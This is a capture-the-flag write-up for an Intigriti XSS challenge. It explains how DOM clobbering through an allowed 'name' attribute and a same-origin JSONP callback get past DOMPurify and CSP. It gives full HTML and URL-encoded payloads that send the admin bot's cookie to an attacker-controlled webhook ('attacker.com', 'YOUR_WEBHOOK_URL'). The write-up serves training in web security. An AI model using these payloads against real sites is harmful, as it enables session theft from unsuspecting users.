# Intigriti Challenge 0326: Secure Search Portal

A client-side web security challenge developed for the Intigriti platform (challenge-0326.intigriti.io). This challenge combines DOM Clobbering (bypassing specific DOMPurify configuration) and a Content Security Policy (CSP) bypass via a JSONP endpoint.

## 🎯 Challenge Goal
Your objective is to exploit a Cross-Site Scripting (XSS) vulnerability to steal the administrator's cookie (the flag).

**Flag Format:** `INTIGRITI{...}`

---

## 🏗️ Architecture

The challenge consists of a Node.js/Express backend and a frontend application:
- **`server.js`**: Serves the frontend, implements a strict Content Security Policy (CSP), a JSONP API endpoint (`/api/stats`), and a `/report` endpoint to trigger the admin bot.
- **`bot.js`**: An automated headless Chrome browser that sets the `FLAG` cookie and visits user-submitted URLs.
- **`public/challenge.html`**: The main page where users can input search queries.
- **`public/js/main.js`**: Handles the search query reflection and integrates DOMPurify.
- **`public/js/components.js`**: A mock component loader and an authentication redirect sink.

---

## 🔍 Vulnerability Details

### 1. Reflected Input and Failed Sanitization
In `main.js`, the `q` parameter is reflected onto the page after passing through `DOMPurify.sanitize(q, { FORBID_ATTR: ['id', 'class', 'style'], KEEP_CONTENT: true })`.
While `id` attributes are forbidden—attempting to block standard DOM Clobbering vectors—the `name` attribute is allowed. In HTML, elements like `<form>`, `<img>`, and `<a>` expose their `name` attributes as properties on the global `window` object. This allows us to achieve DOM Clobbering without needing `id`.

### 2. The DOM Clobbering Sink
In `components.js`, the `window.Auth.loginRedirect` function exhibits a dangerous sink. It checks for `window.authConfig.dataset.next` and `window.authConfig.dataset.append`. If `append === 'true'`, it appends `document.cookie` to `redirectUrl` and triggers `window.location.href = redirectUrl`.

By injecting a form element using the `name` attribute:
```html
<form name="authConfig" data-next="https://attacker.com/" data-append="true"></form>
```
We can control the `redirectUrl` and ensure the cookie is appended.

### 3. Component Loader & CSP Bypass via JSONP
To trigger `window.Auth.loginRedirect`, we cannot simply use an inline script because of the strict CSP (`script-src 'self'`).
However, `components.js` contains a `ComponentManager` that autoloads components based on the `data-config` attribute of any element with `data-component="true"`.

Injecting a component gives us partial control over a dynamic `<script src="...">` load:
```html
<div data-component="true" data-config='{"path":"/api/","type":"stats?callback=window.Auth.loginRedirect&ignore="}'></div>
```

When parsed, `ComponentManager` creates a script tag with the source:
`/api/stats?callback=window.Auth.loginRedirect&ignore=.js`
The `.js` extension (appended by `ComponentManager`) conveniently becomes the value of the `ignore` parameter, leaving `callback=window.Auth.loginRedirect` fully intact.

The server's `/api/stats` is a JSONP endpoint that strictly validates the callback regex (`/^[a-zA-Z0-9_\.]+$/`). `window.Auth.loginRedirect` perfectly matches this regex.
Since `/api/stats` is on the same origin, the CSP allows it! The server responds with `window.Auth.loginRedirect({...})`, effectively executing our sink and sending the admin's cookie to our specified domain.

---

## 🚀 The Solution / Payload

Combine the DOM Clobbering payload with the Component Injection:

```html
<form name="authConfig" data-next="https://YOUR_WEBHOOK_URL/" data-append="true"></form>
<div data-component="true" data-config='{"path":"/api/","type":"stats?callback=window.Auth.loginRedirect&ignore="}'></div>
```

**URL Encoded Payload:**
```
http://localhost:3000/challenge.html?q=%3Cform%20name%3D%22authConfig%22%20data-next%3D%22https%3A%2F%2FYOUR_WEBHOOK_URL%2F%22%20data-append%3D%22true%22%3E%3C%2Fform%3E%3Cdiv%20data-component%3D%22true%22%20data-config%3D%27%7B%22path%22%3A%22%2Fapi%2F%22%2C%22type%22%3A%22stats%3Fcallback%3Dwindow.Auth.loginRedirect%26ignore%3D%22%7D%27%3E%3C%2Fdiv%3E
```

Submit this URL to the `/report` endpoint, and the admin bot will trigger the exploit, sending its cookie (the flag) to your webhook.

---

## 🐳 Build and Run

Deploying the challenge is incredibly easy with Docker Compose.

1. **Clone the repository.**
2. **Build and start the container:**
   ```bash
   docker-compose up -d --build
   ```
3. The challenge will be accessible at `http://localhost:3000`.

*Note: The `docker-compose.yml` configures `seccomp:unconfined` which is required for Puppeteer to run properly in the container.*
